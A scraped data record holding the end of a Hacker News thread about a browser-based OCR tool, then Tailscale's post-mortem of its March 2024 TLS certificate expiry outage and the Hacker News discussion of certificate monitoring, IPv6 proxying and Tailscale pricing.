1. Pre-process PDF images to detect letters better? 2. Use LLMs to spell/grammar check and perhaps even auto-complete missing pieces? 3. Employ rich text to capture style (ex: lexical.dev)? Unsure if it is feasible to bundle it all up for web. See also: https://github.com/RajSolai/TextSnatcher / https://github.com/VikParuchuri/surya reply simonw 12 hours agoparentI've been trying out alternative versions of this that pass images through to e.g. the Claude 3 vision models, but they're harder to share with people because they need an API key! reply euazOn 12 hours agorootparentIn case you wanted to add a pre-processing step, I found this ImageMagick script useful: https://www.fmwconcepts.com/imagemagick/textcleaner/index.ph... Not sure how difficult it is to run it in the browser, though. reply CharlesW 11 hours agorootparentFYI, cert is expired. reply yjftsjthsd-h 8 hours agoparentprev> Use LLMs to spell/grammar check and perhaps even auto-complete missing pieces? I would really want human review. Remember that copier that changed digits because it was being clever with compression? reply fbdab103 11 hours agoprevThe example on the Tesseract.js page shows it highlighting the rectangles of where the selected text originated. Does this level of information get surfaced through the library for consumption? I just grabbed a two-column academic PDF, which performed as well as you would expect. If I was returned a json list of text + coordinates, I could do some dirty munging (eg footer is anything below this y index, column 1 is between these x ranges, column 2 is between these other x ranges) to self-assemble it a bit better. reply simonw 11 hours agoparentYes it does, but I've not dug into the more sophisticated parts of the API at all yet. I'm using it in the most basic way possible right now: const {data: {text}} = await worker.recognize(imageUrl); reply kgbcia 14 hours agoprevI was thinking of doing something like this for visually impaired users. The next step is to pipe it into the JavaScript web speech synthesis API. https://mdn.github.io/dom-examples/web-speech-api/speak-easy... reply mwcampbell 12 hours agoparentWe already have our own tools for that, either integrated into screen readers or available as add-ons. Thanks for the thought, though. reply alexwilde 8 hours agoprevThis is cool! I built something similar but it's CLI based. https://github.com/lifeiswilde/textract-ai reply CaffeinatedDev 11 hours agoprevThis is cool! I've also used tesseract OCR and found it to be pretty amazing in terms of speed and accuracy. I use it for ingest of image and pdf type files for my own website chatting tool: tinydesk.ai! I run the backend on an express js server so all js as well. Smaller docs I do on the client side, but larger ones (>1.5mb) I've found take forever so those process in the backend. reply pyuser583 5 hours agoprevThis behavior really freaks me out. It raises the potential that hostile urls will be introduced. reply voisin 9 hours agoprevIs there something I can run on my Mac that will systematically OCR every PDF on my drive for easy searching? reply simonw 9 hours agoparentMy s3-ocr tool could do that with quite a bit of extra configuration. https://github.com/simonw/s3-ocr You would need to upload them all to S3 first though, which is a bit of a pain just to run OCR (that's Textract's fault). You could try stitching together a bunch of scripts to run the CLI version of Tesseract locally. reply reliablereason 13 hours agoprevSafari already does that. Quite a useful feature. reply minimaxir 13 hours agoparentSpecifically, only Apple Silicon allows automatic OCR. Works on iOS too. reply pvg 12 hours agorootparentIt works on Intel Safari as well. reply minimaxir 12 hours agorootparentIt doesn’t work on my Intel Macs unless it’s really slow. reply __jonas 9 hours agorootparentIt works for me on an Intel MPB (2020) but it's probably a lot slower. On this page: https://en.wikipedia.org/wiki/Typeface it takes almost ~10 seconds for the text in the first image to become selectable after page load. With local images / PDFs in Preview it's really quick though reply pvg 9 hours agorootparentprevMaybe it is! I mostly use it to select text in social media images for which it feels reasonably responsive. reply Noumenon72 7 hours agoparentprevNeat. You can also use MacOS's OCR capability to create a shortcut that allows you to copy and paste the text out of any region on the screen -- for example, a stack trace someone is showing you in a screen share. https://apple.stackexchange.com/a/468362 reply _ache_ 2 hours agoprevFor now, I'm still using OCRmyPDF as it maybe slow but incredible usefull. The files become big but it just works. If an alternative is quicker / lighter I will use it but it must just works. reply zzz999 10 hours agoprevDoes that run locally without the need to share information? reply simonw 10 hours agoparentYes. Nothing leaves your browser. reply smusamashah 9 hours agoprev [–] The amazing thing here is that this tool is almost all compiled using LLM. This is very exciting. I have been using GPT-4 a lot lately to make tiny utilities. Things I wouldn't have even tried because of how much effort it takes to get started on those simple things. I always wanted to make a chrome extension for one thing or another, but all the learning involved around the boilerplate always drained the motivation. But with GPT I built the initial POC in an hour and then polished and published it on store even. Recently I compiled some bash and cmd helper scripts, I don't know either of these enough (do know some bash) and don't have it in me to learn them. Specially the windows batch scripts. Using LLM it was matter of an hour to write a script for my need as either a windows batch script or even bash script. Oh I even used GPT it to write 2-3 AutoHotKey scripts. LLMs are amazing. If you know what you are looking for, you can direct them to your advantage. Very exciting to see that people are using LLMs similarly to build things they want and how they want. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Simon Willison addressed challenges in extracting data from PDFs and images at the Story Discovery At Scale data journalism conference.",
      "He created a web app, tools.simonwillison.net/ocr, leveraging Tesseract OCR in a browser for PDFs and images, eliminating the need to upload data to a server.",
      "By employing LLM models, he efficiently developed and enhanced the tool with features like drag-and-drop and image OCR, ensuring its sustainability with static JavaScript and WebAssembly components."
    ],
    "commentSummary": [
      "The conversation focuses on utilizing OCR (Optical Character Recognition) technology, particularly tesseract.js, to extract text from PDFs and images directly in the browser.",
      "Users discuss their experiences with different OCR tools, methods, and obstacles, emphasizing the significance of precise models and the benefits of leveraging deep learning for enhanced accuracy.",
      "The dialogue also explores the application of Large Language Models (LLMs) for rapid development of utilities and scripts, along with the potential of web speech synthesis to assist visually impaired individuals."
    ],
    "points": 240,
    "commentCount": 41,
    "retryCount": 0,
    "time": 1711823591
  },
  {
    "id": 39875822,
    "title": "Tailscale.com Outage: Lessons Learned & Future Preparations",
    "originLink": "https://tailscale.com/blog/tls-outage-20240307",
    "originBody": "Go back Blog About the Tailscale.com outage on March 7, 2024 About the Tailscale.com outage on March 7, 2024 3 minsMarch 29 2024 Parker Higgins What happenedThe impactSteps to fix Share Article On March 7, 2024, tailscale.com was unavailable for approximately 90 minutes due to an expired TLS certificate. We were able to identify and address the issue quickly, and the downtime was mostly limited to our marketing materials and documentation, with a few exceptions we address below. Still, any unexpected downtime is a problem, and we want to take an opportunity to explain exactly what happened, what the impact was, and what steps we’ve taken to ensure it doesn’t happen again. What happened We rolled out a major website refresh that included a migration to a new hosting provider in December of 2023, just about exactly 90 days before the outage. Keen-eyed readers may recognize that detail as foreshadowing. Our configuration is also a little unusual: because our hosting provider does not natively support IPv6, and because IPv6 is important to us and to our users, we run our own proxy to resolve such requests and list “extra” AAAA records accordingly. That arrangement is deemed a “misconfiguration” by that provider, and we’ve been receiving alerts about it since rolling it out. We did not realize (and the alerts didn’t specify) that the configuration would prevent automatic certificate renewal from completing. One more bit of bad luck: Although we had probers checking certificate expirations, they were only checking over IPv6. As a result, our probers did not surface the impending certificate expiry because they were hitting the proxy—which had a valid certificate that we were managing independently. In the absence of automatic renewal, the certificates for tailscale.com and www.tailscale.com expired on March 7, disrupting access to the site. The impact Fortunately, most Tailscale operations do not require accessing the main website, so many users did not experience any interruption to normal Tailscale usage. The major disruptions instead were: Tailscale documentation, which lives at https://tailscale.com/kb, was inaccessible during the downtime, along with our blog and other reference materials that are available through our website Although our admin console and other settings pages were unaffected, users who did not know to navigate directly to https://login.tailscale.com/ were unable to access those pages and may have assumed that they were offline Our quick install script, hosted at https://tailscale.com/install.sh, was also unavailable, which interfered with some installations (including some automated installs) The domains that actually serve Tailscale packages for installation remained accessible, and we believe that any interruptions to resolution through Go’s go get mechanism were minimal thanks to caching. Steps to fix Once we had determined what the problem was, we responded by temporarily removing the “extra” AAAA records and manually renewing the certificates in question. That immediately resolved the user-facing issue. Of course, we still want our site and our services to be available over IPv6, so we restored those records immediately thereafter. That means the root issue with renewal is still a problem, and we plan to address it in the short term much like our ancestors did: multiple redundant calendar alerts and a designated window to manually renew the certificates ourselves. We also plan to update our prober infrastructure to check IPv4 and IPv6 endpoints separately. We also hope to make our proxy unnecessary by supporting IPv6 in a more straightforward way in our website infrastructure. Finally, while we will endeavor to avoid any outage, it is a nice benefit of Tailscale’s design that this blip did not interrupt most uses for most users. One of our guiding principles is enabling direct connectivity between your machines and services, and that means your network is less reliant on any particular endpoint—even tailscale.com—being available at any given time. Subscribe to Tailscale’s blog We have a deep commitment to keeping your data safe. Too much email?RSSX Loading...",
    "commentLink": "https://news.ycombinator.com/item?id=39875822",
    "commentBody": "About the Tailscale.com outage on March 7, 2024 (tailscale.com)217 points by tatersolid 18 hours agohidepastfavorite109 comments smackeyacky 11 hours agoI've said it before and I'll say it again: expiring certs are the new DNS for outages. I still marvel at just how good Tailscale is. I'm a minor user really but I have two sites that I use tailscale to access: a couple of on-prem servers and my AWS production setup. I can literally work from anywhere - had an issue over the weekend where I was trying to deploy an ECS container but the local wifi was so slow that the deploy kept timing out. I simply SSH'd over to my on-prem development machine, did a git pull of the latest code and did the deploy from there. All while remaining secure with no open ports at all on my on-prem system and none in AWS. Can even do testing against the production Aurora database without any open ports on it, simply run a tailscale agent in AWS on a nano sized EC2. Got another developer you need to give access to your network to? Tailscale makes that trivial (as it does revoking them). Yeah, for that deployment I could just make a GitHub action or something and avoid the perils of terrible internet, but for this I like to do it manually and Tailscale lets me do just that. reply wonrax 5 hours agoparentTailscale remains useful when deploying with GitHub actions. Currently, I have my cloud VM open on an unconventional SSH port so that GHA workers can SSH into it and initiate the deployment. I plan to utilize their action [0] so that any GHA worker can access the deployment machine without exposing any ports. [0] https://github.com/tailscale/github-action reply nurettin 2 hours agoparentprev> simply SSH'd over to my on-prem development machine I use mosh and gnu screen for flaky connections. Works wonders even if you disconnect every 10 seconds. reply lmeyerov 17 hours agoprevExpiring certs strikes again! I'd recommend as part of the post mortem to move their install script off their marketing site or putting in some other fallback so marketing site activity is unrelated to customer operations critical path. They're almost there for maintaining that typical isolation, which helps bc this kind of thing is common. We track uptime of our various providers, and seeing bits like the GitHub or Zendesk sites go down is more common than we expected... and they're the good cases. reply GICodeWarrior 16 hours agoparentFurther, security of a marketing site tends to be lower priority than the product itself, and an install script should generally be secured similar to the product. reply bradfitz 16 hours agorootparentYes. We're lamentably probably going to have to move it (the install script), even though it has a nice URL today. When we picked that URL, the marketing site was created and run by the same people who built the rest of the product, so it didn't seem like a concern at the time. reply oliviabenson 14 hours agorootparentYou can achieve both. The only mistake you made was to half-bake the proxy (doing it for IPv6 only): proxy every http(s) request to tailscale.com. Vercel’s platform is valuable for a whole host of reasons, the networking side isn’t that important, your developers will greatly value the use of Vercel even if every request is being proxied through a web server hosting tailscale.com which responds to a request for /install.sh instead of passing it through to the marketing site. (In Google Cloud you could do it entirely with load balancing rules, no need to even run a web server) reply bradfitz 13 hours agorootparentThat is exactly what I want us to do :) reply hunter2_ 5 hours agorootparentprev> it has a nice URL today `curl -fsSL https://install.tailscale.comsh` wouldn't be any less nice. Append /sh if having something human-friendly at the root is desirable (SEO, etc.), and you're still at the same overall length as today. reply ShakataGaNai 13 hours agorootparentprevThat's great that DevOps (or whatever their title) owns both product and marketing sites. Far too many companies (and DevOps teams) think the www site is \"not important\" or \"not their core job\" and outsource it to either a less qualified team, or out of the company altogether. From an external perspective no one cares if www going down isn't \"your fault\" or of \"direct impact to the product\". It's a corporate blackeye either way. reply raffraffraff 1 hour agorootparent\"Far too many companies (and DevOps teams) think the www site is \"not important\" or \"not their core job\" and outsource it to either a less qualified team, or out of the company altogether\" It's impossible to know because they won't admit it publicly. You are guessing based on some anecdotal experience. But then again... here's mine! I worked at a very successful SaaS that had (really not kidding) the most incompetent, lazy dope running the www site. He live-edited a \"staging\" version of the site on the fly (no, it wasn't private, you could access this thing from the internet, and he didn't know or care about that). When he was happy with his changes he'd destroy the live instances behind the load balancer and clone his staging instance without taking it down or running any extra checks. This staging instance was around for years and I don't think he ever bothered doing a system update. Since he didn't use git, I I'll bet that at least once he cloned a live instance back to staging to undo a bunch of bork. I lost count of the incidents. He never detected them himself, was never available to troubleshoot them and was generally a big \"durrrr\" when you'd finally get him on the call. Example: one time we had a \"slow, intermittent errors\" customer support ticket surfaced to us, not because it was our job, but because dopey was being an absolute ass to the helpdesk guys. He ran his crap in another AWS account we didn't have access to. About a day later the www site went down completely, so we got hold of the AWS account and dug in. All 5 of the instances behind the load balance were \"unhealthy\" for various reasons. Certs expired, disks full, apache stopped. We bounced them, restarted them and sshed in. They all had different versions of the site. It was a complete mess. Turns out dopey wasn't very good at killing the old instances and cloning staging. He was probably live-editing the instances for smaller changes if that seemed easier than a bunch of AWS console work. Unbelievably he wasn't fired and continued to mismanage the site, and we could do nothing because the head of marketing didn't listen to the head of engineering. They hated each other. The way Marketing saw it \"your SRE guys couldn't fix it, they had to wait forto get on the call\". I'm not even kidding. Just more anecdotal evidence from me. You might be right. reply wlonkly 7 hours agorootparentprevAlas, the part you're describing as great is written in past tense. reply jonhohle 9 hours agorootparentprevOrgitecture† strikes! † A systems architecture tightly coupled to the structure of the organization in which it was created. reply j45 14 hours agoparentprevBrings to mind if there's a service that will monitor all the certs and their expiry. Cloudflare seems to handle a fair bit of this if you host your domain with them, but you have to use Cloudflare. reply cassianoleal 12 hours agorootparentPush their expiry date as a UNIX timestamp to whatever TSDB you use and hook up an alert for when it gets close. reply nijave 7 hours agorootparentprevThis is common in synthetic test software reply snapplebobapple 15 hours agoprevI really like these guys, I wish their pricings wasn't so ridiculous. proper access control shouldn't cost 18 bucks a month for a vpn, it's basically unsellable to management at that price and the lower tiers are unsellable without it. reply starttoaster 14 hours agoparentI'm really interested in what you're comparing Tailscale to internally, because it does way more than just VPN. What are the cheaper options, and do they also have an SSH feature, oauth authentication to the network for automation services, the ability to stand up VPN node loadbalancers in kubernetes clusters, and ACME certificate request automation through LetsEncrypt? Just to list a few features that I use from Tailscale's free tier that I don't normally think of as the job of a VPN service. And they're constantly adding new features that make it a really interesting and competitive choice, in my opinion. Honestly I'm mostly interested in this take because I'm shocked by how much they offer in the cheaper tiers. reply snapplebobapple 9 hours agorootparentMy problem is I don't care about any of the stuff you mentioned because I can't easily recreate my internal vlan segregation at the six dollar tier, I need to pay up for the 18 dollar a user tier, which is insane pricing for my shop of 70-100 users. Compare to the included fortissl vpn that is provided by my router. I can add users to groups in active directory that are then synced to azuread, which provides saml authentication to the vpn. Users login with their O365 credentials and I can configure it to mimic the already approved vlan segregation easily based on groups provided by O365. This basic stuff should just be there for a corporate solution and it appears to be but for 100 users the bill is 21.6k/year, which is literally 4 times higher than I can justify/ get approved. Yes it has a bunch of other features, but they are irrelevant because the basics aren't there at a price that is doable. reply datascienced 3 hours agorootparentThe problem might be your approval process? $18 compared to fully loaded monthly cost is nothing. Unless you are using 100 tools like this maybe. Or based in LCOL location. The pricing isn’t ridiculous, it is by design. For better of worse SaaS pricing is about finding features (regardless of their actual cost) that act as signals for “is a customer who can afford more”. The $6 tier was you paying their marketing and market research cost by you trying them out :-). They probably don’t need the $6 they need the data that you were willing to pay something! reply starttoaster 8 hours agorootparentprev> Yes it has a bunch of other features, but they are irrelevant because the basics aren't there at a price that is doable. The basics don't cost $18/user/month though. The whole package does. I hear what you're saying, and maybe you just accidentally worded it this way, but the obvious rebuttal to it is: How much would it cost you to set up a solution where only ACL'd users can SSH into your infrastructure/servers? You're looking at services that cost money like Userify for that. For many of the other features Tailscale offers, you're probably either paying another service to handle that responsibility, not doing it at all, or you're spending your time recreating it, and I bet your time isn't cheap to the company either. Anyway, that's somewhat of a hypothetical rebuttal. I actually assume you did the due diligence and weighed the cost with the portion of the feature set that you actually would make use of. I could see the price being more fair if they offered a lower cost tier that only provided the VPN and ACLs for unlimited users, but I'm not a savvy businessman so I'm not sure if it makes sense for a multi-tool company to sell a minority of users a screwdriver. reply snapplebobapple 6 hours agorootparentYou're assuming that feature matters to me (it does but I have a lot of users relative to servers, so even the most basic tier of userify express or their cloud offering would handle my needs for dramatically less than premium tailscale). What you're missing is the foundation of being able to deploy something like this depends on easy acls that integrate with my current identity system (i.e. saml) because I need to be able to control access per business unit so that when the mesh of everything is brought online users still only have access to the subset of systems they should have access to. This matters whether it's Sheila in accounting who only ever uses it to remote desktop to her on prem workstation, or jackie in IT using it to manage on prem servers across multiple locations and cloud servers. So yes, maybe a small subset of my users are actually using enough of the premium bundle to justify that cost but I can't even mix and match because the basis of every use case (the ACLs) are only in the premium package in a functional way. reply basch 3 hours agorootparentprevHave you contacted them about custom pricing? “Im not going to use most of your features, can I have 75% off” isn’t as outlandish as it sounds. Willing to bet they would bite. reply conception 13 hours agorootparentprevBut if you’re comparing it to other VPNs and only need VPN the pricing is bonkers. reply starttoaster 13 hours agorootparentThat's fair. I guess if you just need a VPN, it doesn't really make sense to consider a product that packs all of these VPN-adjacent features. But part of my point was how much you're able to do on Tailscale for free, so in that regard, the pricing really doesn't seem as bonkers to me, to be honest. The $6/month tier is also incredibly reasonable for unlimited users, but it is annoying, I'll grant, that they actually drop some ACL features from Free tier to Starter. I suppose that's how they funnel a large number of enterprises from considering Starter in favor of Premium. But if you actually make use of the feature set of the platform, which if you have a decent DevOps team I'm pretty sure there's tools in there that they'll love, then $18/User/month actually doesn't seem too outrageous to me. reply newdee 11 hours agorootparentprevWhich other VPNs? And are you talking about trad VPN (concentrators/hub & spoke)? If so, you wouldn’t be considering Tailscale anyway. reply stingraycharles 5 hours agoparentprevI had a very easy time selling this. We moved away from an OpenVPN setup, and Tailscale made it so much easier to onboard new employees and to do a lot more things “the right way”. We’re a fully remote company, so it’s even more important. Although I admit that in my role I have quite a lot of weight in convincing management on these topics, price was not a concern. We’ve been a happy customer since April last year, everyone on the premium / “expensive” tier. I’m also very impressed with their development speed: some features that were said “May take a few years to be delivered” actually were delivered last year already. Cloudflare One could have been an alternative, but that would have been even more expensive. reply djbusby 7 hours agoparentprevWhat management is tripping over $18/mo? Per person that expense is closer to zero than any of a dozen other things we're buying for them. reply MobiusHorizons 5 hours agorootparentPretty sure that is the monthly cost per user, not a flat monthly fee. reply j45 14 hours agoparentprevYou can install headscale and self-host for nothing then. Tailscale has competitors too with some overlaps, it might not be fully what you're looking for. All I know is within a few minutes I had more of a project working together than without it. It really is one of the more remarkably simple tools out there for everything it does, and has a generous free tier with 100 devices and 3 users. reply j-krieger 13 hours agorootparentJust a quick heads up, colleagues of mine could not successfully host headscale themselves. In the end, they saw the value and bought tailscale access. Configuring wireguard really is that hard. Tailscale is easily worth it reply linsomniac 9 hours agorootparentFYI: I've been self-hosting headscale for 9 months or so, and it's pretty brilliant. I didn't find it very hard to set up. A dedicated DERP server was pretty hard to set up, but most of that was I was trying to host it behind our office load balancer, and that's no bueno. But once I put it on a dedicated IP,my secondary DERP was pretty easy. But, if you are going to self-host, seriously consider Nebula instead of tailscale. Unless you need non-technical users accessing it, tailscale has a better story there. (edit) The biggest downside of headscale is I don't feel confident I can update ACLs without having a high likelihood of taking down the entire tailnet until I can get it fixed. reply eddieroger 10 hours agorootparentprevYour (their) mileage may vary. I set up Headscale with external auth and it's been a dream, the kind where I don't really have to think too much about it. The only little gotcha is that sometimes getting the iOS client to read the server url from settings can be tricky. But once authed, it \"just works\" for me. reply snapplebobapple 9 hours agorootparentprevIt wasn't hard to setup headscale (or netbird for that matter). I have setup both to test at home fairly easily. They aren't appropriate for a corporate setting though. I actually want to pay somebody for this because I want the support when some change causes this to eat it at 4 in the morning with the business day about to start with a strong requirement for it to be working. reply hnarn 12 hours agorootparentprev> colleagues of mine could not successfully host headscale themselves it’d be interesting to know why, I use it frequently at work and it’s worked pretty well so far. reply watermelon0 13 hours agorootparentprevIIRC, Wireguard is exclusively managed by Tailscale clients, and not by the server (headscale in this case). reply j45 12 hours agorootparentprevAny details? Could be adjacent self-hosting issues compared to headscale itself. Considering it can also run in a docker container, it’s next to trivial to install locally to try out https://headscale.net/running-headscale-container/ reply j45 14 hours agorootparentprevLink to headscale https://github.com/juanfont/headscale reply nerdbaggy 17 hours agoprevI wonder what provider they use for their website. Sounds like a lot of hoops to jump through for IPV6 when just about any other provider has IPv6 support. reply p1mrx 17 hours agoparent$ host www.tailscale.com www.tailscale.com has address 76.76.21.21 # Vercel www.tailscale.com has IPv6 address 2600:9000:a51d:27c1:6748:d035:a989:fb3c # Amazon www.tailscale.com has IPv6 address 2600:9000:a602:b1e6:5b89:50a1:7cf7:67b8 # Amazon IPv4 uses a Let's Encrypt certificate, while IPv6 uses an Amazon certificate. reply opheliate 16 hours agorootparentThe Vercel IPv6 feature request & surrounding discussion makes for frustrating reading: https://github.com/orgs/vercel/discussions/47 reply aftbit 14 hours agorootparentWow, all comments removed as spam or hidden by default, update posted saying \"We are targeting to land support for IPv6 towards the beginning of next year.\" Well, Q1 2024 has come and gone. Where's IPv6 support or the communication about what is happening? Good reason to never use Vercel if you ask me. reply miyuru 16 hours agorootparentprevVercel's VP of product has been asking for requirements for IPv6 there. This should be a good one. https://github.com/orgs/vercel/discussions/47#discussioncomm... It painful to see tech providers go down this road, which is pretty similar to what's happening at Boeing. (Business taking over Engineering) reply kawsper 15 hours agorootparentprevIt feels like the same anywhere, sadly, DigitalOceans IPv6 support in their loadbalancer product have been \"under review\" since 2021: https://ideas.digitalocean.com/network/p/ipv6-for-load-balan... reply opello 16 hours agorootparentprevOnly if you expand all the discussion they've hidden! Ignorance is bliss, right? > We are targeting to land support for IPv6 towards the beginning of next year. We will communicate updates on this issue. Was from 2023-10-01, I guess it's early until June 30. reply watermelon0 13 hours agorootparentI'd say that the beginning of the year ends at the end of Q1, if not earlier. reply jsf01 7 hours agorootparentprevWhat is it about ipv6 that is so difficult for hosting providers to support? reply nijave 7 hours agorootparentIt costs money reply physicles 6 hours agoprevThey have monitoring for their infrastructure, right? Add 50 lines of code that connects to all public domains on ipv4 and ipv6 and alerts if the cert expires in under 19 days. Set automatic renewal to happen 20 days out. Done. I wrote this code years ago, after missing a couple ssl renewals in the early days of our small company. Haven’t had an ssl-related outage since. Edit: this is the only necessary fix, no need for calendar invites: > We also plan to update our prober infrastructure to check IPv4 and IPv6 endpoints separately. reply gnat 10 hours agoprevThey made the same mistake we did at a former company — put a link to our webapp’s login page (app.foo.com) on the marketing site (www.foo.com) homepage. It wasn’t until our first marketing web site outage that we realised that our $40/mo hosting plan was not merely hosting a “marketing site” but rather critical infrastructure. That was a load-bearing $40 hosting plan. Our app wasn’t down but the users thought it was. I learned then that users follow the trails you make for them without realising there are others, and if you take one away then a segment of your user base be completely lost. reply PokestarFan 6 hours agoparentWhen I type \"tailscale\" into my browser, the first result is tailscale.com. I do not need to use the tailscale admin console often enough that I would go out of my way to memorize the different URL. My browser used to autofill dash.cloudflare.com when I typed in cloudflare. I visited the cloudflare.com website exactly once and now that's what shows up in the first result, and I find myself doing the same thing with Cloudflare. reply MikusR 40 minutes agorootparentCouple years ago there was an outage at Cloudflare and their www.cloudflare.com started pointing to an unrelated 3rd party marketing website, while the dash.cloudflare.com was showing the dashboard. reply basch 3 hours agorootparentprevTime for an industry standard subdomain. www for the website app, signin, login, entr, for the sign in page. reply johnnyAghands 13 hours agoprevWow, mad jelly their CI/CD and monitoring proceses are robust enough to trust a major rollout in December. That's a pretty badass eng culture That being said, still some unanswered questions: - If the issue was ipv6 configuration breaking automated cert renewals for ipv4, wouldn't they have hit this like.. a long time ago? Did I miss something here? - Why did this take 90 minutes to resolve? I know it's like a blog post and not a real post-mortem, but some kind of timeline would have been nice to include in the post. - Why not move to DNS provider that natively supports ipv6s? Also I'm curious if it's worth the overhead to have a dedicated domain for scripts/packages? Do other folks do this? (excluding third-parties like package repositories). reply Thorrez 13 hours agoparent>- If the issue was ipv6 configuration breaking automated cert renewals for ipv4, wouldn't they have hit this like.. a long time ago? Did I miss something her AIUI, they switched to their current setup 90 days prior to the outage. The initial cert they installed during their migration lasted 90 days. So 90 days after the migration, they had an outage. reply PokestarFan 6 hours agoparentprevThey're using Vercel, which lacks IPv6 support. reply agwa 16 hours agoprevWhy does the proxy need to terminate TLS? If it were just a TCP proxy, then at least the monitoring wouldn't have been fooled into thinking the certificate wasn't about to expire. Heck, a TCP proxy might even allow automatic renewal to work if the domain validation is being done using a TLS-ALPN challenge. reply p1mrx 11 hours agoparentA TCP proxy discards the user's IP address, unless you use something like the PROXY protocol[1], which then needs to be supported by the target HTTPS server. You would also need a way to prevent unauthorized users from injecting their own PROXY header. This isn't a problem if you don't need the user's IP address at all, but it's often useful for logging and abuse detection. [1] https://www.haproxy.org/download/1.8/doc/proxy-protocol.txt reply bradfitz 13 hours agoparentprevIt doesn't. That was one of our mistakes and action items to fix. The original proxy was stood up quickly when it was first discovered IPv6 was broken and the people standing up the proxy didn't know at the time how ACME worked. We'll be changing it to just a TCP proxy. reply ikiris 12 hours agorootparent> and the people standing up the proxy didn't know at the time how ACME worked yikes reply bradfitz 12 hours agorootparentTo be fair, it didn't help the provider's docs were inconsistent about whether dns-01 or http-01 was to be used. reply PokestarFan 6 hours agorootparentI've done enough fighting with Certbot to learn that the path of least resistance is to use dns-01 with the cloudflare plugin, and just make a very limited access key and store it on the servers that I am using to renew the cert. reply bastawhiz 16 hours agoparentprevNot that it's an amazing reason, but H3 doesn't run over TCP, and running a UDP proxy doesn't sound like a great time. reply ignoramous 14 hours agorootparent> UDP proxy doesn't sound like a great time QUIC, in particular, is harder to proxy (if you're load balancing, say: https://quicwg.org/ops-drafts/draft-ietf-quic-manageability....). If it is point-to-point and you control both those points (forward A to B with ports open as approp), proxying any protocol should be straightforward, no? reply cayde 12 hours agorootparentI donet believe they control the Vercel endpoint \"B\" reply amluto 13 hours agoparentprevA non-TLS-terminating proxy is a great thing to host on a service like Hetzner. If you set up CAA correctly, then you are trusting the provider for latency and availability only, and you might as well avoid hilariously expensive services like CloudFront or an EC2-based proxy. Hmm, it looks like Tailscale is using NetActuate for pkgs.tailscale.com. I bet NetActuate could help serve up a non-terminating proxy with plenty of PoPs at a reasonable price. Their website doesn’t give pricing, but it sounds like the kind of company that doesn’t mark up egress 50x. reply SahAssar 10 hours agorootparent> A non-TLS-terminating proxy is a great thing to host on a service like Hetzner. If you set up CAA correctly, then you are trusting the provider for latency and availability only, and you might as well avoid hilariously expensive services like CloudFront or an EC2-based proxy. Are you really getting any latency or availability improvements in that case? What does a non-TLS-terminating proxy give you? reply amluto 9 hours agorootparentFunctionality. The reason for having a proxy at all seems to be that Vercel doesn’t support IPv4. reply RulerOf 14 hours agoparentprevThey may have AWS CloudFront CDN in front of it for IPv6. If you're doing that, you're terminating TLS at CloudFront. I don't believe that's optional. reply fanf2 16 hours agoparentprevI think a TCP proxy would also work with http challenges. reply agwa 15 hours agorootparentIt would, but so would an HTTP proxy. It makes make think the hosting provider doesn't use HTTP challenges. reply fanf2 13 hours agorootparentAn http proxy would need to be configured cleverly enough to serve its own acme challenges directly, and proxy any requests for the backend’s acme challenges. Which is I think the trick that was missed by the tailscale setup. reply agwa 10 hours agorootparentGood point! reply benreesman 5 hours agoprevAnything even remotely security adjacent that TailScale as an institution even remotely fumbles even once is too dangerous for the merely mildly paranoid (like me for example). We need a better story on this. reply eacapeisfutuile 5 hours agoprev> That arrangement is deemed a “misconfiguration” by that provider, and we’ve been receiving alerts about it since rolling it out So 90 days of alerts about certs, and then certs fail? reply tczMUFlmoNk 5 hours agoparentIt sounds more like \"90 days of alerts about DNS, and then certs fail\". The fact that the presence of IPv6/AAAA DNS records causes Vercel to decline to auto-renew certificates seems to not have been known to the Tailscale team prior to the incident. (I haven't seen the alerts in question, so I don't know whether they made this fact clear.) reply Scubabear68 17 hours agoprev“That means the root issue with renewal is still a problem, and we plan to address it in the short term much like our ancestors did: multiple redundant calendar alerts and a designated window to manually renew the certificates ourselves”. reply lijok 17 hours agoparentThe other day I was looking for a system where we can track recurring yearly/monthly/etc tasks (such as cert rotation) and get alerted a week before and on the day. 2~ hours into my search, contemplating building my own, someone pointed out we can just use a shared gsuite calendar. How the mind overcomplicates things sometimes.. reply supriyo-biswas 16 hours agorootparentUptime Kuma[1] has a certificate expiry notification feature. [1] https://github.com/louislam/uptime-kuma reply rnewme 15 hours agorootparentUptime kuma is cool. reply j45 14 hours agorootparentprevThanks for the tip! reply _joel 16 hours agorootparentprevI'd probably spend the effort adding ssl expiration to the monitoring system for all the certs in use. Trigger then a month/week whatever before they're due to expire. reply rustcleaner 16 hours agorootparentWe both got the downdoot simultaneously, someone didn't like our contributions. :^) reply eastbound 15 hours agorootparentprevJira. Create an automation that clones tickets on due dates. reply j45 14 hours agorootparentJira is really underrated for it's workflows and automations. Part of my love/hate relationship with JIRA was until the lightbulb that it's not supposed to work perfect out of the box because no two places are the same. reply rustcleaner 16 hours agorootparentprevnext [3 more] [flagged] nimih 16 hours agorootparent> When the Third Millennium Stasis kick off, basilisks on leashes, those are the intelligence treasure troves they will stripmine your optionality with. I don't know what all this means, but generally I think it's probably not too hard to deduce an org's schedule for certificate rotation by just looking at the expiration dates on those same certificates. reply lijok 16 hours agorootparentprevI understand and somewhat agree with what you're saying. But good luck justifying that to the business. reply BuildTheRobots 3 hours agoparentprevHow can someone be hosting infrastructure without some form of monitoring and alerting framework? Domain and cert expiry (not just for your estate but for any of your dependencies) seems like the lowest of the hanging fruit checks to implement when setting that up. reply gigatexal 11 hours agoprevSurely they can automate the renewal? It seems their solution is a manual one. Am I being a simpleton? reply linsomniac 8 hours agoparentThe issue they mention is that renewals are automated, but the IPv4-hosting service noticed some extra IPv6 addresses and halted the renewals because of that. On top of that, their monitoring of cert expiry was checking the IPv6 proxy so it didn't notice the problem. reply aktuel 14 hours agoprevThat's why I roll my VPN locally. One less party to worry about. reply txutxu 13 hours agoparentThe P in VPN has been perverted long time ago. reply edward28 12 hours agorootparentVirtually public network reply NelsonMinar 17 hours agoprevThe conclusion is hilarious: \"we plan to address it in the short term much like our ancestors did: multiple redundant calendar alerts and a designated window to manually renew the certificates ourselves\" Devops is so 2023. Back to ops! reply bradfitz 16 hours agoparentThat was mostly a joke. You know we're going to fix it properly, Nelson :) (But super short term, yes.) reply NelsonMinar 16 hours agorootparentFair enough! But you might want to add this feed to your Google Reader, Brad :-) https://scrutineer.tech/monitor/cert/tailscale.com.rss reply j45 14 hours agoparentprevIt's a joke but also the least that should be in place while whatever fix is coming is put into place. A simple cronjob would look like it would handle it, but what 